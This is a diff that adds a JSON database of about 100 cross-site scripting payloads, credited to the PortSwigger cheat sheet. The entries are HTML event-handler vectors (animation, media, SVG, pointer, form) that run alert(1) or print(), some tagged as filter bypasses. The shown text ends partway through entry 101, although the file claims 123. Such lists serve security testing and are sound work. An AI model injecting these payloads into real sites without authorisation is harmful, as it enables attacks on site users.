@@ -1,0 +1,1241 @@
+{
+  "meta": {
+    "name": "Payloader XSS Database",
+    "version": "2.0",
+    "updated": "2026-03-04",
+    "source": "https://portswigger.net/web-security/cross-site-scripting/cheat-sheet",
+    "total": 123
+  },
+  "payloads": [
+    {
+      "id": 1,
+      "code": "<style>@keyframes x{}</style><xss style=\"animation-name:x\" onanimationend=\"alert(1)\"></xss>",
+      "description": "CSS animation end event — fires when keyframe animation completes",
+      "category": "animation",
+      "context": ["html"],
+      "tags": ["html", "auto", "animation", "css"],
+      "auto_exec": true,
+      "verified": false
+    },
+    {
+      "id": 2,
+      "code": "<style>@keyframes x{}</style><xss style=\"animation-name:x\" onanimationstart=\"alert(1)\"></xss>",
+      "description": "CSS animation start event — fires when keyframe animation begins",
+      "category": "animation",
+      "context": ["html"],
+      "tags": ["html", "auto", "animation", "css"],
+      "auto_exec": true,
+      "verified": false
+    },
+    {
+      "id": 3,
+      "code": "<style>@keyframes slidein {}</style><xss style=\"animation-duration:1s;animation-name:slidein;animation-iteration-count:2\" onanimationiteration=\"alert(1)\"></xss>",
+      "description": "CSS animation iteration event — fires on each repeat of the animation",
+      "category": "animation",
+      "context": ["html"],
+      "tags": ["html", "auto", "animation", "css"],
+      "auto_exec": true,
+      "verified": false
+    },
+    {
+      "id": 4,
+      "code": "<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><xss id=x style=\"position:absolute;\" onanimationcancel=\"print()\"></xss>",
+      "description": "CSS animation cancel event — fires when animation is interrupted before completion",
+      "category": "animation",
+      "context": ["html"],
+      "tags": ["html", "animation", "css", "target"],
+      "auto_exec": false,
+      "verified": false
+    },
+    {
+      "id": 5,
+      "code": "<style>@keyframes x{}</style><xss style=\"animation-name:x\" onwebkitanimationend=\"alert(1)\"></xss>",
+      "description": "WebKit-prefixed animation end event — Safari/older Chrome bypass",
+      "category": "animation",
+      "context": ["html"],
+      "tags": ["html", "auto", "animation", "webkit", "bypass"],
+      "auto_exec": true,
+      "verified": false
+    },
+    {
+      "id": 6,
+      "code": "<style>@keyframes x{}</style><xss style=\"animation-name:x\" onwebkitanimationstart=\"alert(1)\"></xss>",
+      "description": "WebKit-prefixed animation start event",
+      "category": "animation",
+      "context": ["html"],
+      "tags": ["html", "auto", "animation", "webkit", "bypass"],
+      "auto_exec": true,
+      "verified": false
+    },
+    {
+      "id": 7,
+      "code": "<style>@keyframes slidein {}</style><xss style=\"animation-duration:1s;animation-name:slidein;animation-iteration-count:2\" onwebkitanimationiteration=\"alert(1)\"></xss>",
+      "description": "WebKit-prefixed animation iteration event",
+      "category": "animation",
+      "context": ["html"],
+      "tags": ["html", "auto", "animation", "webkit", "bypass"],
+      "auto_exec": true,
+      "verified": false
+    },
+    {
+      "id": 8,
+      "code": "<xss id=x style=\"transition:outline 1s\" ontransitionend=alert(1) tabindex=1></xss>",
+      "description": "CSS transition end event — fires when a CSS transition finishes",
+      "category": "animation",
+      "context": ["html"],
+      "tags": ["html", "auto", "transition", "css"],
+      "auto_exec": true,
+      "verified": false
+    },
+    {
+      "id": 9,
+      "code": "<style>:target {color:red;}</style><xss id=x style=\"transition:color 1s\" ontransitionstart=alert(1)></xss>",
+      "description": "CSS transition start — fires when transition begins via :target selector",
+      "category": "animation",
+      "context": ["html"],
+      "tags": ["html", "transition", "css", "target"],
+      "auto_exec": false,
+      "verified": false
+    },
+    {
+      "id": 10,
+      "code": "<style>:target {transform: rotate(180deg);}</style><xss id=x style=\"transition:transform 2s\" ontransitionrun=print()></xss>",
+      "description": "CSS transition run event — fires before the delay begins",
+      "category": "animation",
+      "context": ["html"],
+      "tags": ["html", "transition", "css", "target"],
+      "auto_exec": false,
+      "verified": false
+    },
+    {
+      "id": 11,
+      "code": "<style>:target {color: red;}</style><xss id=x style=\"transition:color 10s\" ontransitioncancel=print()></xss>",
+      "description": "CSS transition cancel event — fires when transition is interrupted",
+      "category": "animation",
+      "context": ["html"],
+      "tags": ["html", "transition", "css", "target"],
+      "auto_exec": false,
+      "verified": false
+    },
+    {
+      "id": 12,
+      "code": "<style>:target {color:red;}</style><xss id=x style=\"transition:color 1s\" onwebkittransitionend=alert(1)></xss>",
+      "description": "WebKit-prefixed transition end — Safari/older Chrome bypass",
+      "category": "animation",
+      "context": ["html"],
+      "tags": ["html", "transition", "webkit", "bypass", "target"],
+      "auto_exec": false,
+      "verified": false
+    },
+    {
+      "id": 13,
+      "code": "<audio oncanplay=alert(1)><source src=1.mp3 type=audio/mpeg></audio>",
+      "description": "Audio canplay event — fires when browser can start playing audio",
+      "category": "media",
+      "context": ["html"],
+      "tags": ["html", "auto", "audio", "media"],
+      "auto_exec": true,
+      "verified": false
+    },
+    {
+      "id": 14,
+      "code": "<video oncanplaythrough=alert(1)><source src=1.mp4 type=video/mp4></video>",
+      "description": "Video canplaythrough event — fires when video can play without buffering stops",
+      "category": "media",
+      "context": ["html"],
+      "tags": ["html", "auto", "video", "media"],
+      "auto_exec": true,
+      "verified": false
+    },
+    {
+      "id": 15,
+      "code": "<video controls><source src=1.mp4 type=video/mp4><track default oncuechange=alert(1) src=\"data:text/vtt,WEBVTT FILE\\n1\\n00:00:00.000 --> 00:00:05.000\\n<b>XSS</b>\"></video>",
+      "description": "Video track cuechange event — fires when text track cue changes",
+      "category": "media",
+      "context": ["html"],
+      "tags": ["html", "video", "track", "media"],
+      "auto_exec": false,
+      "verified": false
+    },
+    {
+      "id": 16,
+      "code": "<audio controls ondurationchange=alert(1)><source src=1.mp3 type=audio/mpeg></audio>",
+      "description": "Audio durationchange event — fires when audio duration is known",
+      "category": "media",
+      "context": ["html"],
+      "tags": ["html", "auto", "audio", "media"],
+      "auto_exec": true,
+      "verified": false
+    },
+    {
+      "id": 17,
+      "code": "<audio controls autoplay onended=alert(1)><source src=1.mp3 type=audio/mpeg></audio>",
+      "description": "Audio ended event — fires when audio playback finishes",
+      "category": "media",
+      "context": ["html"],
+      "tags": ["html", "audio", "media", "autoplay"],
+      "auto_exec": false,
+      "verified": false
+    },
+    {
+      "id": 18,
+      "code": "<audio onloadeddata=alert(1)><source src=1.mp3 type=audio/mpeg></audio>",
+      "description": "Audio loadeddata event — fires when first frame of audio is loaded",
+      "category": "media",
+      "context": ["html"],
+      "tags": ["html", "auto", "audio", "media"],
+      "auto_exec": true,
+      "verified": false
+    },
+    {
+      "id": 19,
+      "code": "<audio autoplay onloadedmetadata=alert(1)><source src=1.mp3 type=audio/mpeg></audio>",
+      "description": "Audio loadedmetadata event — fires when audio metadata is loaded",
+      "category": "media",
+      "context": ["html"],
+      "tags": ["html", "auto", "audio", "media"],
+      "auto_exec": true,
+      "verified": false
+    },
+    {
+      "id": 20,
+      "code": "<video onloadstart=alert(1)><source></video>",
+      "description": "Video loadstart event — fires when video begins loading",
+      "category": "media",
+      "context": ["html"],
+      "tags": ["html", "auto", "video", "media"],
+      "auto_exec": true,
+      "verified": false
+    },
+    {
+      "id": 21,
+      "code": "<audio autoplay onplay=alert(1)><source src=1.mp3 type=audio/mpeg></audio>",
+      "description": "Audio play event — fires when audio starts playing",
+      "category": "media",
+      "context": ["html"],
+      "tags": ["html", "audio", "media", "autoplay"],
+      "auto_exec": false,
+      "verified": false
+    },
+    {
+      "id": 22,
+      "code": "<audio autoplay onplaying=alert(1)><source src=1.mp3 type=audio/mpeg></audio>",
+      "description": "Audio playing event — fires after pause/buffering when playback resumes",
+      "category": "media",
+      "context": ["html"],
+      "tags": ["html", "audio", "media", "autoplay"],
+      "auto_exec": false,
+      "verified": false
+    },
+    {
+      "id": 23,
+      "code": "<audio controls onprogress=alert(1)><source src=1.mp3 type=audio/mpeg></audio>",
+      "description": "Audio progress event — fires as browser downloads audio data",
+      "category": "media",
+      "context": ["html"],
+      "tags": ["html", "auto", "audio", "media"],
+      "auto_exec": true,
+      "verified": false
+    },
+    {
+      "id": 24,
+      "code": "<audio controls onsuspend=alert(1)><source src=1.mp3 type=audio/mpeg></audio>",
+      "description": "Audio suspend event — fires when audio loading is intentionally suspended",
+      "category": "media",
+      "context": ["html"],
+      "tags": ["html", "auto", "audio", "media"],
+      "auto_exec": true,
+      "verified": false
+    },
+    {
+      "id": 25,
+      "code": "<audio controls autoplay ontimeupdate=alert(1)><source src=1.mp3 type=audio/mpeg></audio>",
+      "description": "Audio timeupdate event — fires repeatedly during playback",
+      "category": "media",
+      "context": ["html"],
+      "tags": ["html", "audio", "media", "autoplay"],
+      "auto_exec": false,
+      "verified": false
+    },
+    {
+      "id": 26,
+      "code": "<audio controls loop muted autoplay onwaiting=alert(1)><source src=1.mp3 type=audio/mpeg></audio>",
+      "description": "Audio waiting event — fires when playback stops due to buffering",
+      "category": "media",
+      "context": ["html"],
+      "tags": ["html", "audio", "media", "autoplay"],
+      "auto_exec": false,
+      "verified": false
+    },
+    {
+      "id": 27,
+      "code": "<audio src=1 onerror=alert(1)>",
+      "description": "Audio onerror — fires when audio fails to load; short and auto-executes",
+      "category": "media",
+      "context": ["html"],
+      "tags": ["html", "auto", "audio", "onerror"],
+      "auto_exec": true,
+      "verified": false
+    },
+    {
+      "id": 28,
+      "code": "<body onload=alert(1)>",
+      "description": "Body onload — classic payload, fires when page finishes loading",
+      "category": "window",
+      "context": ["html"],
+      "tags": ["html", "auto", "body", "onload"],
+      "auto_exec": true,
+      "verified": false
+    },
+    {
+      "id": 29,
+      "code": "<body onbeforeprint=alert(1)>",
+      "description": "Body onbeforeprint — fires before the document is printed",
+      "category": "window",
+      "context": ["html"],
+      "tags": ["html", "body"],
+      "auto_exec": false,
+      "verified": false
+    },
+    {
+      "id": 30,
+      "code": "<body onhashchange=alert(1)>",
+      "description": "Body onhashchange — fires when URL fragment identifier changes",
+      "category": "window",
+      "context": ["html"],
+      "tags": ["html", "body", "hash", "dom"],
+      "auto_exec": false,
+      "verified": false
+    },
+    {
+      "id": 31,
+      "code": "<body onmessage=alert(1)>",
+      "description": "Body onmessage — fires when postMessage is received from another window",
+      "category": "window",
+      "context": ["html"],
+      "tags": ["html", "body"],
+      "auto_exec": false,
+      "verified": false
+    },
+    {
+      "id": 32,
+      "code": "<body onpagereveal=alert(1)>",
+      "description": "Body onpagereveal — fires when page is revealed via back/forward navigation (modern browsers)",
+      "category": "window",
+      "context": ["html"],
+      "tags": ["html", "auto", "body"],
+      "auto_exec": true,
+      "verified": false
+    },
+    {
+      "id": 33,
+      "code": "<body onpageshow=alert(1)>",
+      "description": "Body onpageshow — fires when page is shown, including from browser cache",
+      "category": "window",
+      "context": ["html"],
+      "tags": ["html", "auto", "body"],
+      "auto_exec": true,
+      "verified": false
+    },
+    {
+      "id": 34,
+      "code": "<body onpopstate=alert(1)>",
+      "description": "Body onpopstate — fires when active history entry changes",
+      "category": "window",
+      "context": ["html"],
+      "tags": ["html", "body", "dom"],
+      "auto_exec": false,
+      "verified": false
+    },
+    {
+      "id": 35,
+      "code": "<body onresize=alert(1)>",
+      "description": "Body onresize — fires when the browser window is resized",
+      "category": "window",
+      "context": ["html"],
+      "tags": ["html", "body"],
+      "auto_exec": false,
+      "verified": false
+    },
+    {
+      "id": 36,
+      "code": "<body onscroll=alert(1)><div style=height:1000px></div>",
+      "description": "Body onscroll — fires when page is scrolled",
+      "category": "window",
+      "context": ["html"],
+      "tags": ["html", "body"],
+      "auto_exec": false,
+      "verified": false
+    },
+    {
+      "id": 37,
+      "code": "<body onunhandledrejection=alert(1)><script>fetch('//x')<\\/script>",
+      "description": "Body onunhandledrejection — fires when a rejected Promise is not caught",
+      "category": "window",
+      "context": ["html"],
+      "tags": ["html", "auto", "body", "script"],
+      "auto_exec": true,
+      "verified": false
+    },
+    {
+      "id": 38,
+      "code": "<xss onscrollend=alert(1) style=\"display:block;overflow:auto;width:500px;height:100px;\"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></xss>",
+      "description": "onscrollend — fires when scroll animation or user scroll finishes",
+      "category": "window",
+      "context": ["html"],
+      "tags": ["html", "scroll"],
+      "auto_exec": false,
+      "verified": false
+    },
+    {
+      "id": 39,
+      "code": "<address onscrollsnapchange=alert(1) style=overflow-y:hidden;scroll-snap-type:x><div style=scroll-snap-align:center>1337</div></address>",
+      "description": "onscrollsnapchange — fires when scroll snap target changes",
+      "category": "window",
+      "context": ["html"],
+      "tags": ["html", "scroll"],
+      "auto_exec": false,
+      "verified": false
+    },
+    {
+      "id": 40,
+      "code": "<body onselectionchange=alert(1)>",
+      "description": "onselectionchange — fires when selected text in document changes",
+      "category": "window",
+      "context": ["html"],
+      "tags": ["html", "body"],
+      "auto_exec": false,
+      "verified": false
+    },
+    {
+      "id": 41,
+      "code": "<input onauxclick=alert(1)>",
+      "description": "onauxclick — fires on middle mouse button or other auxiliary button click",
+      "category": "interaction",
+      "context": ["html"],
+      "tags": ["html", "input", "attribute"],
+      "auto_exec": false,
+      "verified": false
+    },
+    {
+      "id": 42,
+      "code": "<xss onblur=alert(1) id=x tabindex=1 style=display:block>test</xss><input autofocus>",
+      "description": "onblur — fires when element loses focus; input autofocus forces blur on custom element",
+      "category": "interaction",
+      "context": ["html"],
+      "tags": ["html", "auto", "attribute", "autofocus"],
+      "auto_exec": true,
+      "verified": false
+    },
+    {
+      "id": 43,
+      "code": "<input onchange=alert(1)>",
+      "description": "oninput change — fires when input value changes and element loses focus",
+      "category": "interaction",
+      "context": ["html"],
+      "tags": ["html", "input", "attribute"],
+      "auto_exec": false,
+      "verified": false
+    },
+    {
+      "id": 44,
+      "code": "<xss onclick=alert(1) style=display:block>click me</xss>",
+      "description": "onclick — fires on left mouse button click; interaction required",
+      "category": "interaction",
+      "context": ["html"],
+      "tags": ["html", "attribute"],
+      "auto_exec": false,
+      "verified": false
+    },
+    {
+      "id": 45,
+      "code": "<xss oncontextmenu=alert(1) style=display:block>right-click me</xss>",
+      "description": "oncontextmenu — fires on right-click / context menu request",
+      "category": "interaction",
+      "context": ["html"],
+      "tags": ["html", "attribute"],
+      "auto_exec": false,
+      "verified": false
+    },
+    {
+      "id": 46,
+      "code": "<xss oncopy=alert(1) autofocus tabindex=1 style=display:block>copy me</xss>",
+      "description": "oncopy — fires when content is copied; autofocus targets the element",
+      "category": "interaction",
+      "context": ["html"],
+      "tags": ["html", "attribute", "autofocus"],
+      "auto_exec": false,
+      "verified": false
+    },
+    {
+      "id": 47,
+      "code": "<xss oncut=alert(1) autofocus tabindex=1 style=display:block>cut me</xss>",
+      "description": "oncut — fires when content is cut from element",
+      "category": "interaction",
+      "context": ["html"],
+      "tags": ["html", "attribute", "autofocus"],
+      "auto_exec": false,
+      "verified": false
+    },
+    {
+      "id": 48,
+      "code": "<xss ondblclick=alert(1) style=display:block>double-click me</xss>",
+      "description": "ondblclick — fires on double click",
+      "category": "interaction",
+      "context": ["html"],
+      "tags": ["html", "attribute"],
+      "auto_exec": false,
+      "verified": false
+    },
+    {
+      "id": 49,
+      "code": "<xss onfocus=alert(1) autofocus tabindex=1>",
+      "description": "onfocus with autofocus — auto-executes on page load by claiming focus",
+      "category": "interaction",
+      "context": ["html"],
+      "tags": ["html", "auto", "attribute", "autofocus"],
+      "auto_exec": true,
+      "verified": false
+    },
+    {
+      "id": 50,
+      "code": "<a id=x tabindex=1 onfocusin=alert(1)></a>",
+      "description": "onfocusin — fires when element or any descendant gains focus (bubbles)",
+      "category": "interaction",
+      "context": ["html"],
+      "tags": ["html", "attribute", "anchor"],
+      "auto_exec": false,
+      "verified": false
+    },
+    {
+      "id": 51,
+      "code": "<a onbeforecopy=alert(1) contenteditable>select and copy</a>",
+      "description": "onbeforecopy — fires before copy operation is triggered on contenteditable",
+      "category": "interaction",
+      "context": ["html"],
+      "tags": ["html", "attribute", "anchor"],
+      "auto_exec": false,
+      "verified": false
+    },
+    {
+      "id": 52,
+      "code": "<a onbeforecut=alert(1) contenteditable>select and cut</a>",
+      "description": "onbeforecut — fires before cut operation on contenteditable element",
+      "category": "interaction",
+      "context": ["html"],
+      "tags": ["html", "attribute", "anchor"],
+      "auto_exec": false,
+      "verified": false
+    },
+    {
+      "id": 53,
+      "code": "<xss contenteditable onbeforeinput=alert(1)>type here</xss>",
+      "description": "onbeforeinput — fires before input value changes in contenteditable",
+      "category": "interaction",
+      "context": ["html"],
+      "tags": ["html", "attribute"],
+      "auto_exec": false,
+      "verified": false
+    },
+    {
+      "id": 54,
+      "code": "<xss onbeforepaste=alert(1) contenteditable>paste here</xss>",
+      "description": "onbeforepaste — fires before paste operation",
+      "category": "interaction",
+      "context": ["html"],
+      "tags": ["html", "attribute"],
+      "auto_exec": false,
+      "verified": false
+    },
+    {
+      "id": 55,
+      "code": "<input type=file oncancel=alert(1)>",
+      "description": "oncancel on file input — fires when file picker dialog is dismissed",
+      "category": "interaction",
+      "context": ["html"],
+      "tags": ["html", "input", "attribute"],
+      "auto_exec": false,
+      "verified": false
+    },
+    {
+      "id": 56,
+      "code": "<button popovertarget=x>Click me</button><xss onbeforetoggle=alert(1) popover id=x>XSS</xss>",
+      "description": "onbeforetoggle on popover — fires before popover show/hide state changes",
+      "category": "interaction",
+      "context": ["html"],
+      "tags": ["html", "attribute", "popover"],
+      "auto_exec": false,
+      "verified": false
+    },
+    {
+      "id": 57,
+      "code": "<dialog open onclose=alert(1)><form method=dialog><button>close</button></form></dialog>",
+      "description": "Dialog onclose — fires when dialog element is closed",
+      "category": "interaction",
+      "context": ["html"],
+      "tags": ["html", "attribute"],
+      "auto_exec": false,
+      "verified": false
+    },
+    {
+      "id": 58,
+      "code": "<button commandfor=test command=show-popover>Click</button><div id=test oncommand=alert(1) popover>XSS</div>",
+      "description": "oncommand — fires when button with commandfor activates the target",
+      "category": "interaction",
+      "context": ["html"],
+      "tags": ["html", "attribute"],
+      "auto_exec": false,
+      "verified": false
+    },
+    {
+      "id": 59,
+      "code": "<xss id=x onbeforematch=alert(1) hidden=until-found>hidden content</xss>",
+      "description": "onbeforematch — fires when browser find-in-page reveals a hidden element",
+      "category": "interaction",
+      "context": ["html"],
+      "tags": ["html", "attribute"],
+      "auto_exec": false,
+      "verified": false
+    },
+    {
+      "id": 60,
+      "code": "<details ontoggle=alert(1) open>details</details>",
+      "description": "Details ontoggle open — auto-executes when details element is pre-opened",
+      "category": "interaction",
+      "context": ["html"],
+      "tags": ["html", "auto", "attribute", "details"],
+      "auto_exec": true,
+      "verified": false
+    },
+    {
+      "id": 61,
+      "code": "<xss draggable=true ondrag=alert(1) style=display:block>drag me</xss>",
+      "description": "ondrag — fires continuously while element is being dragged",
+      "category": "drag",
+      "context": ["html"],
+      "tags": ["html", "attribute", "drag"],
+      "auto_exec": false,
+      "verified": false
+    },
+    {
+      "id": 62,
+      "code": "<xss draggable=true ondragend=alert(1) style=display:block>drag me</xss>",
+      "description": "ondragend — fires when drag operation ends (drop or cancel)",
+      "category": "drag",
+      "context": ["html"],
+      "tags": ["html", "attribute", "drag"],
+      "auto_exec": false,
+      "verified": false
+    },
+    {
+      "id": 63,
+      "code": "<xss draggable=true ondragenter=alert(1) style=display:block>drag over me</xss>",
+      "description": "ondragenter — fires when dragged element enters a drop target",
+      "category": "drag",
+      "context": ["html"],
+      "tags": ["html", "attribute", "drag"],
+      "auto_exec": false,
+      "verified": false
+    },
+    {
+      "id": 64,
+      "code": "<xss draggable=true ondragleave=alert(1) style=display:block>drag over me</xss>",
+      "description": "ondragleave — fires when dragged element leaves a drop target",
+      "category": "drag",
+      "context": ["html"],
+      "tags": ["html", "attribute", "drag"],
+      "auto_exec": false,
+      "verified": false
+    },
+    {
+      "id": 65,
+      "code": "<xss draggable=true ondragover=alert(1) style=display:block>drag over</xss>",
+      "description": "ondragover — fires continuously while dragged over a valid drop target",
+      "category": "drag",
+      "context": ["html"],
+      "tags": ["html", "attribute", "drag"],
+      "auto_exec": false,
+      "verified": false
+    },
+    {
+      "id": 66,
+      "code": "<xss draggable=true ondragstart=alert(1) style=display:block>drag start</xss>",
+      "description": "ondragstart — fires when user begins dragging an element",
+      "category": "drag",
+      "context": ["html"],
+      "tags": ["html", "attribute", "drag"],
+      "auto_exec": false,
+      "verified": false
+    },
+    {
+      "id": 67,
+      "code": "<xss ondrop=alert(1) style=display:block;border:2px dashed>drop here</xss>",
+      "description": "ondrop — fires when a dragged element is dropped onto the target",
+      "category": "drag",
+      "context": ["html"],
+      "tags": ["html", "attribute", "drag"],
+      "auto_exec": false,
+      "verified": false
+    },
+    {
+      "id": 68,
+      "code": "<xss onpointercancel=alert(1) style=display:block>test</xss>",
+      "description": "onpointercancel — fires when pointer event is cancelled (touch interrupted)",
+      "category": "pointer",
+      "context": ["html"],
+      "tags": ["html", "attribute", "pointer"],
+      "auto_exec": false,
+      "verified": false
+    },
+    {
+      "id": 69,
+      "code": "<xss onpointerdown=alert(1) style=display:block>press me</xss>",
+      "description": "onpointerdown — fires when pointer device button is pressed",
+      "category": "pointer",
+      "context": ["html"],
+      "tags": ["html", "attribute", "pointer"],
+      "auto_exec": false,
+      "verified": false
+    },
+    {
+      "id": 70,
+      "code": "<xss onpointerenter=alert(1) style=display:block>enter me</xss>",
+      "description": "onpointerenter — fires when pointer enters element bounds (doesn't bubble)",
+      "category": "pointer",
+      "context": ["html"],
+      "tags": ["html", "attribute", "pointer"],
+      "auto_exec": false,
+      "verified": false
+    },
+    {
+      "id": 71,
+      "code": "<xss onpointerleave=alert(1) style=display:block>leave me</xss>",
+      "description": "onpointerleave — fires when pointer leaves element bounds",
+      "category": "pointer",
+      "context": ["html"],
+      "tags": ["html", "attribute", "pointer"],
+      "auto_exec": false,
+      "verified": false
+    },
+    {
+      "id": 72,
+      "code": "<xss onpointermove=alert(1) style=display:block>move over me</xss>",
+      "description": "onpointermove — fires when pointer moves while over element",
+      "category": "pointer",
+      "context": ["html"],
+      "tags": ["html", "attribute", "pointer"],
+      "auto_exec": false,
+      "verified": false
+    },
+    {
+      "id": 73,
+      "code": "<xss onpointerout=alert(1) style=display:block>move away</xss>",
+      "description": "onpointerout — fires when pointer leaves element or its children",
+      "category": "pointer",
+      "context": ["html"],
+      "tags": ["html", "attribute", "pointer"],
+      "auto_exec": false,
+      "verified": false
+    },
+    {
+      "id": 74,
+      "code": "<xss onpointerover=alert(1) style=display:block>hover me</xss>",
+      "description": "onpointerover — fires when pointer moves over element or its children",
+      "category": "pointer",
+      "context": ["html"],
+      "tags": ["html", "attribute", "pointer"],
+      "auto_exec": false,
+      "verified": false
+    },
+    {
+      "id": 75,
+      "code": "<xss onpointerup=alert(1) style=display:block>release here</xss>",
+      "description": "onpointerup — fires when pointer device button is released",
+      "category": "pointer",
+      "context": ["html"],
+      "tags": ["html", "attribute", "pointer"],
+      "auto_exec": false,
+      "verified": false
+    },
+    {
+      "id": 76,
+      "code": "<xss ongotpointercapture=alert(1) style=display:block>test</xss>",
+      "description": "ongotpointercapture — fires when element captures pointer using setPointerCapture()",
+      "category": "pointer",
+      "context": ["html"],
+      "tags": ["html", "attribute", "pointer"],
+      "auto_exec": false,
+      "verified": false
+    },
+    {
+      "id": 77,
+      "code": "<xss onlostpointercapture=alert(1) style=display:block>test</xss>",
+      "description": "onlostpointercapture — fires when pointer capture is released",
+      "category": "pointer",
+      "context": ["html"],
+      "tags": ["html", "attribute", "pointer"],
+      "auto_exec": false,
+      "verified": false
+    },
+    {
+      "id": 78,
+      "code": "<xss onpointerrawupdate=alert(1) style=display:block>move over me</xss>",
+      "description": "onpointerrawupdate — fires with raw (un-coalesced) pointer events, high frequency",
+      "category": "pointer",
+      "context": ["html"],
+      "tags": ["html", "attribute", "pointer"],
+      "auto_exec": false,
+      "verified": false
+    },
+    {
+      "id": 79,
+      "code": "<xss onmouseover=alert(1) style=display:block>hover me</xss>",
+      "description": "onmouseover — classic hover event; fires when mouse enters element",
+      "category": "pointer",
+      "context": ["html"],
+      "tags": ["html", "attribute"],
+      "auto_exec": false,
+      "verified": false
+    },
+    {
+      "id": 80,
+      "code": "<xss onmousedown=alert(1) style=display:block>click me</xss>",
+      "description": "onmousedown — fires when mouse button is pressed down",
+      "category": "pointer",
+      "context": ["html"],
+      "tags": ["html", "attribute"],
+      "auto_exec": false,
+      "verified": false
+    },
+    {
+      "id": 81,
+      "code": "<xss onmouseup=alert(1) style=display:block>click me</xss>",
+      "description": "onmouseup — fires when mouse button is released",
+      "category": "pointer",
+      "context": ["html"],
+      "tags": ["html", "attribute"],
+      "auto_exec": false,
+      "verified": false
+    },
+    {
+      "id": 82,
+      "code": "<xss onmouseout=alert(1) style=display:block>hover then leave</xss>",
+      "description": "onmouseout — fires when mouse leaves element",
+      "category": "pointer",
+      "context": ["html"],
+      "tags": ["html", "attribute"],
+      "auto_exec": false,
+      "verified": false
+    },
+    {
+      "id": 83,
+      "code": "<xss onwheel=alert(1) style=display:block>scroll over me</xss>",
+      "description": "onwheel — fires when mouse wheel or trackpad scroll is used over element",
+      "category": "pointer",
+      "context": ["html"],
+      "tags": ["html", "attribute"],
+      "auto_exec": false,
+      "verified": false
+    },
+    {
+      "id": 84,
+      "code": "<input oninput=alert(1)>",
+      "description": "oninput — fires synchronously when input value changes",
+      "category": "form",
+      "context": ["html"],
+      "tags": ["html", "input", "attribute"],
+      "auto_exec": false,
+      "verified": false
+    },
+    {
+      "id": 85,
+      "code": "<input oninvalid=alert(1) required>",
+      "description": "oninvalid — fires when form validation fails on required input",
+      "category": "form",
+      "context": ["html"],
+      "tags": ["html", "input", "attribute", "form"],
+      "auto_exec": false,
+      "verified": false
+    },
+    {
+      "id": 86,
+      "code": "<form onreset=alert(1)><input type=reset value=reset></form>",
+      "description": "onreset — fires when form reset button is clicked",
+      "category": "form",
+      "context": ["html"],
+      "tags": ["html", "form", "attribute"],
+      "auto_exec": false,
+      "verified": false
+    },
+    {
+      "id": 87,
+      "code": "<form onsubmit=alert(1)><input type=submit value=submit></form>",
+      "description": "onsubmit — fires when form is submitted",
+      "category": "form",
+      "context": ["html"],
+      "tags": ["html", "form", "attribute"],
+      "auto_exec": false,
+      "verified": false
+    },
+    {
+      "id": 88,
+      "code": "<form onformdata=alert(1)><input type=submit></form>",
+      "description": "onformdata — fires after FormData is constructed during submission",
+      "category": "form",
+      "context": ["html"],
+      "tags": ["html", "form", "attribute"],
+      "auto_exec": false,
+      "verified": false
+    },
+    {
+      "id": 89,
+      "code": "<input type=search onsearch=alert(1)>",
+      "description": "onsearch — fires when search input is submitted (press Enter or click X)",
+      "category": "form",
+      "context": ["html"],
+      "tags": ["html", "input", "attribute"],
+      "auto_exec": false,
+      "verified": false
+    },
+    {
+      "id": 90,
+      "code": "<textarea onselect=alert(1)>select this text</textarea>",
+      "description": "onselect (textarea) — fires when text is selected inside textarea",
+      "category": "form",
+      "context": ["html"],
+      "tags": ["html", "attribute"],
+      "auto_exec": false,
+      "verified": false
+    },
+    {
+      "id": 91,
+      "code": "<input onselect=alert(1) value=selectme>",
+      "description": "onselect (input) — fires when text in input field is selected",
+      "category": "form",
+      "context": ["html"],
+      "tags": ["html", "input", "attribute"],
+      "auto_exec": false,
+      "verified": false
+    },
+    {
+      "id": 92,
+      "code": "<select onchange=alert(1)><option value=1>Option 1</option><option value=2>Option 2</option></select>",
+      "description": "Select onchange — fires when dropdown selection changes",
+      "category": "form",
+      "context": ["html"],
+      "tags": ["html", "attribute", "form"],
+      "auto_exec": false,
+      "verified": false
+    },
+    {
+      "id": 93,
+      "code": "<input onkeydown=alert(1)>",
+      "description": "onkeydown — fires when any key is pressed down",
+      "category": "keyboard",
+      "context": ["html"],
+      "tags": ["html", "input", "attribute", "keyboard"],
+      "auto_exec": false,
+      "verified": false
+    },
+    {
+      "id": 94,
+      "code": "<input onkeypress=alert(1)>",
+      "description": "onkeypress — fires when key producing a character is pressed (deprecated but supported)",
+      "category": "keyboard",
+      "context": ["html"],
+      "tags": ["html", "input", "attribute", "keyboard"],
+      "auto_exec": false,
+      "verified": false
+    },
+    {
+      "id": 95,
+      "code": "<input onkeyup=alert(1)>",
+      "description": "onkeyup — fires when key is released",
+      "category": "keyboard",
+      "context": ["html"],
+      "tags": ["html", "input", "attribute", "keyboard"],
+      "auto_exec": false,
+      "verified": false
+    },
+    {
+      "id": 96,
+      "code": "<svg onload=alert(1)>",
+      "description": "SVG onload — fires when SVG is loaded; short and reliably auto-executes",
+      "category": "svg",
+      "context": ["html"],
+      "tags": ["html", "auto", "svg"],
+      "auto_exec": true,
+      "verified": false
+    },
+    {
+      "id": 97,
+      "code": "<svg/onload=alert(1)>",
+      "description": "SVG onload with slash — bypasses some filters that require space before event",
+      "category": "svg",
+      "context": ["html"],
+      "tags": ["html", "auto", "svg", "bypass"],
+      "auto_exec": true,
+      "verified": false
+    },
+    {
+      "id": 98,
+      "code": "<svg><animate onbegin=alert(1) attributeName=x dur=1s>",
+      "description": "SVG animate onbegin — fires when SVG animation timeline begins",
+      "category": "svg",
+      "context": ["html"],
+      "tags": ["html", "auto", "svg"],
+      "auto_exec": true,
+      "verified": false
+    },
+    {
+      "id": 99,
+      "code": "<svg><animate onend=alert(1) attributeName=x dur=1s>",
+      "description": "SVG animate onend — fires when SVG animation timeline ends",
+      "category": "svg",
+      "context": ["html"],
+      "tags": ["html", "auto", "svg"],
+      "auto_exec": true,
+      "verified": false
+    },
+    {
+      "id": 100,
+      "code": "<svg><animate onrepeat=alert(1) attributeName=x dur=1s repeatCount=2>",
+      "description": "SVG animate onrepeat — fires on each repetition of SVG animation",
+      "category": "svg",
+      "context": ["html"],
+      "tags": ["html", "auto", "svg"],
+      "auto_exec": true,
+      "verified": false
+    },
+    {
+      "id": 101,
+      "code": "<img src=x onerror=alert(1)>",
+      "description": "img onerror — classic; fires when image src fails to load",
+      "category": "special",
+      "context": ["html"],
+      "tags": ["html", "auto", "img", "onerror"],
